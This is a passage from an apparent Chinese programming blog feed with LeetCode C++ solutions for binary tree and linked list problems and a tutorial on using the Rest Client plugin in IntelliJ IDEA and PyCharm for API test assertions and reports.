node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt;q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> curLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curLevel;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;curLevelSize;i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                curLevel.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)            </span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);</span><br><span class="line">                </span><br><span class="line">            }</span><br><span class="line">            res.<span class="built_in">push_back</span>(curLevel);</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="103-二叉树的锯齿形层次遍历"><a href="#103-二叉树的锯齿形层次遍历" class="headerlink" title="103. 二叉树的锯齿形层次遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层次遍历</a></h5><blockquote><p>给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。</p><p>例如：<br>给定二叉树 [3,9,20,null,null,15,7],</p><p> 3<br>/ <br>9  20<br> /  <br>15   7<br>返回锯齿形层次遍历如下：</p><p>[<br>[3],<br>[20,9],<br>[15,7]<br>]</p></blockquote><p>思路：特定层结果翻转即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">zigzagLevelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="type">bool</span> toggle=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> curLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curLevel;            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;curLevelSize;i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                curLevel.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);                               </span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(toggle)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">reverse</span>(curLevel.<span class="built_in">begin</span>(),curLevel.<span class="built_in">end</span>());</span><br><span class="line">            }               </span><br><span class="line">            toggle=!toggle;</span><br><span class="line">            res.<span class="built_in">push_back</span>(curLevel);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="二叉搜索树应用"><a href="#二叉搜索树应用" class="headerlink" title="二叉搜索树应用"></a>二叉搜索树应用</h3><h5 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h5><blockquote><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p></blockquote><h6 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h6><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;res;</span><br><span class="line">        <span class="built_in">inOrder</span>(root,res);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>()<span class="number">-1</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(res[i]&gt;=res[i<span class="number">+1</span>])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inOrder</span><span class="params">(TreeNode*root,vector&lt;<span class="type">int</span>&gt; &amp;res)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inOrder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inOrder</span>(root-&gt;right,res);</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="701-二叉搜索树中的插入操作"><a href="#701-二叉搜索树中的插入操作" class="headerlink" title="701. 二叉搜索树中的插入操作"></a><a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/">701. 二叉搜索树中的插入操作</a></h5><blockquote><p>给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 保证原始二叉搜索树中不存在新值。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="type">int</span> val)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val&lt;val)</span><br><span class="line">        {</span><br><span class="line">            root-&gt;right=<span class="built_in">insertIntoBST</span>(root-&gt;right,val);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            root-&gt;left=<span class="built_in">insertIntoBST</span>(root-&gt;left,val);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 数据结构 </tag>
        
            
            
        <tag> 二叉树 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Rest Client在idea的使用</title>
      
      
      <link href="/cn/posts/34566/"/>
      
      
      <url>/cn/posts/34566/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p><strong>首先，打开IntelliJ IDEA或pycharm，安装Rest Client。</strong></p><p><strong>File -&gt; Setting -&gt; Plug-ins -&gt; Browse Repository</strong></p><p>搜索Rest Client，点击右侧的install，稍等片刻会提醒要重启IDEA，重启后安装结束。</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p>使用时候，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/dc6420f5bfcb4f0caaa4612c0a77f7da.jpeg"></p><p><strong>之后，IDEA REST Client控制台的界面如下样子。</strong></p><p>这个控制台展示的功能区有请求方式，请求参数和请求头的填充等等。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/72bfdacadd0e4f18b6041bd1531f5246.jpeg"></p><p>如果需要用户名、密码验证，点击右侧按钮，会弹出填充用户名和密码的窗口。</p><p>填完后会自动补充到Authorization 的header里面去。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/1ee7661ac0c948cdb46de50b7ee701fb.jpeg"></p><p>Rest Client插件会自动将最近执行的50个请求保存到http-requests-log.http 文件中。</p><p>该文件存储在项目的.idea /httpRequests/目录下。</p><p>使用请求历史记录，用户可以快速导航到特定响应并再次发出请求。</p><p><strong>除了构建请求，发起RESTful请求，Rest Client插件还可以完成如下postman不能做到的功能：</strong></p><p>• 模板构建请求；</p><p>• 多个环境区分；</p><p>• 结果断言；</p><p>• 结果暂存；</p><h5 id="添加-token"><a href="#添加-token" class="headerlink" title="添加 token"></a>添加 token</h5><h4 id="3-pycharm中测试结果断言及生成测试报告"><a href="#3-pycharm中测试结果断言及生成测试报告" class="headerlink" title="3.pycharm中测试结果断言及生成测试报告"></a>3.pycharm中测试结果断言及生成测试报告</h4><p>先进入rest client插件界面，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开后， REST Client控制台的界面如下样式：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/e4cddce1ca634475b9c60c99d4949842.jpeg"></p><p>点一下右上方的“Convert request to the new format”，接口请求各个参数自动生成一个配置文件，在IDE上边文件编辑框内。</p><p>文件名为：rest-api.http，默认存放在.PyCharm2019.2configscratches。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/87fe1df9a7594e0b9dedcaafe28cf4ba.jpeg"></p><h5 id="测试结果断言设置"><a href="#测试结果断言设置" class="headerlink" title="测试结果断言设置"></a>测试结果断言设置</h5><p>把上面生成的rest-api.http文件内容都删除，重新写入如下内容：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/03f790e427ce4af3abcdc93bad4d8dea.jpeg"></p><blockquote><p>解释：</p><ol><li><p>client.test，表示下面的是一个测试用例，第一个参数是测试用例名字，第二个参数是一个函数包含着测试断言。</p></li><li><p>断言由client.assert带出，第一个参数是判断条件，第二个参数是测试失败时候战士的信息。</p></li></ol><p>鼠标移动到“GET”右侧的按钮，会出现“Run httpbin.org”（Run 后面的是测试接口的链接）</p></blockquote><p>点击弹出的标签，测试执行。Console界面自动展示出执行结果。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/e6212321bc724d0bb5ad515363c23078.jpeg"></p><p>点击“Console”标签右侧的“test”标签，可以看到具体执行结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/47d61cd6209a4e2288fe86169fd955ab.jpeg"></p><h5 id="自己写一个测试用例和断言"><a href="#自己写一个测试用例和断言" class="headerlink" title="自己写一个测试用例和断言"></a>自己写一个测试用例和断言</h5><p>仿照上面的例子，写一个测试用例和断言，判断response的headers里面的某一个字段。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/b1a3ea4dcf8b4ea6b02b908afbf51d88.jpeg"></p><p>还是像上面那样执行测试用例。</p><p>“console”标签没变化，但是右侧的“test”标签内容很不一样了。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/90287850460349e19903cd6c0a7adbaf.jpeg"></p><p>两个测试用例都通过。</p><h5 id="生成检测报告"><a href="#生成检测报告" class="headerlink" title="生成检测报告"></a>生成检测报告</h5><p>在“test”标签里，点击“Export Test Result”，可以将测试结果导出成测试报告</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/ef48152bb3804fae962dcab4f3997776.jpeg"></p><p>在弹出对话框中，保存测试报告到指定位置。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/1c9196e4ae9a431b919a378bfe83c033.jpeg"></p><p>测试报告：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/897690e446b54dc189f6535d75a4d6a0.jpeg"></p><h5 id="测试调试"><a href="#测试调试" class="headerlink" title="测试调试"></a>测试调试</h5><p>如果想调试测试用例、测试断言，或者想看中间结果，怎么办？</p><p>可以用：client.log函数</p><p>看一下修改后的例子：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/3b1c4027409c45ea952eb75a63af7cdf.jpeg"></p><p>比如：想要看一下GET接口返回的headers信息，可以直接client.log(response.headers)打印结果。上下的两个client.log(“============”)没有实际意义，只是让结果看起来更容易找到。</p><p>像上面提到的那样执行之后，结果在“test”标签页里可以看到：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/27644624f1ef408180c601e688ce5d5e.jpeg"></p><p>执行多次后出现的 json 文件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/aada2feaeb294782999c37567e964b93.jpeg"></p><p>点击右侧的蓝色反向双箭头，可以看到这些json链接的作用是为了让用户可以对比任意两次接口测试结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/e448aeed7a67447fa6f86a86fa2693aa.jpeg"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/34566/d021b4e814d24d7aae0e1152a0a837d7.jpeg"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 后端 </tag>
        
            
            
        <tag> java </tag>
        
            
            
        <tag> idea </tag>
        
            
            
        <tag> 测试 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：链表</title>
      
      
      <link href="/cn/posts/26939/"/>
      
      
      <url>/cn/posts/26939/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ul><li><p>null异常处理</p></li><li><p>dummy node 哑巴节点</p></li><li><p>双指针/快慢指针</p></li><li><p>插入一个节点到排序链表</p></li><li><p>从一个链表中移除一个节点</p></li><li><p>翻转链表</p></li><li><p>合并两个链表</p></li><li><p>找到链表的中间节点</p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="83-删除排序链表中的重复元素"><a href="#83-删除排序链表中的重复元素" class="headerlink" title="83. 删除排序链表中的重复元素"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">83. 删除排序链表中的重复元素</a></h4><blockquote><p>给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。</p><p>示例 1:</p><p>输入: 1-&gt;1-&gt;2<br>输出: 1-&gt;2<br>示例 2:</p><p>输入: 1-&gt;1-&gt;2-&gt;3-&gt;3<br>输出: 1-&gt;2-&gt;3</p></blockquote><h5 id="直接法："><a href="#直接法：" class="headerlink" title="直接法："></a><strong>直接法：</strong></h5><p>链表是有序的，所以直接更改当前结点的 next 指针，跳过下一个结点并直接指向下一个结点之后的结点即可。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        ListNode *current=head;</span><br><span class="line">        <span class="comment">//null异常处理</span></span><br><span class="line">        <span class="keyword">while</span>(current!=<span class="literal">NULL</span>&amp;&amp;current-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//一直删除，直到下一个不重复 </span></span><br><span class="line">            <span class="comment">// 想想如果把while改成if怎么样</span></span><br><span class="line">            <span class="comment">//把current-&gt;next!=NULL删除会怎么样</span></span><br><span class="line">            <span class="keyword">while</span>(current-&gt;next!=<span class="literal">NULL</span>&amp;&amp;current-&gt;val==current-&gt;next-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                current-&gt;next=current-&gt;next-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">//移动到下一个节点</span></span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>时间复杂度：O(n)，因为列表中的每个结点都检查一次以确定它是否重复，所以总运行时间为 O(n)，其中 n是列表中的结点数。</p></li><li><p>空间复杂度：O(1)，没有使用额外的空间。</p></li></ul><h4 id="82-删除排序链表中的重复元素-II"><a href="#82-删除排序链表中的重复元素-II" class="headerlink" title="82. 删除排序链表中的重复元素 II"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">82. 删除排序链表中的重复元素 II</a></h4><blockquote><p>给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。</p><p>示例 1:</p><p>输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5<br>输出: 1-&gt;2-&gt;5<br>示例 2:</p><p>输入: 1-&gt;1-&gt;1-&gt;2-&gt;3<br>输出: 2-&gt;3</p></blockquote><h5 id="利用哑结点-："><a href="#利用哑结点-：" class="headerlink" title="利用哑结点 ："></a><strong>利用哑结点</strong> ：</h5><p>为了防止删除头结点的极端情况发生，先创建空结点dummy，使dummy指向传入的head结点。</p><p>然后创建一个cur指针指向dummy，比较cur的后两个结点，看他们是否相同。</p><p>如果相同，则说明cur后有重复元素，此时创建一个temp指针指向第一个重复元素，即cur-&gt;next;</p><p>通过循环进行去重，循环结束后temp指向的是这群重复元素的最后一个，依照题意此时temp的下一个才是我们想要的。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="comment">//设置哑结点 防止删除头结点的情况发生后的问题</span></span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        dummy-&gt;next=head;</span><br><span class="line">        ListNode *cur=dummy;<span class="comment">//cur 指向哑结点</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next!=<span class="literal">NULL</span>&amp;&amp;cur-&gt;next-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//比较cur后两个结点</span></span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;next-&gt;val==cur-&gt;next-&gt;next-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//去重</span></span><br><span class="line">                ListNode *temp=cur-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(temp-&gt;next!=<span 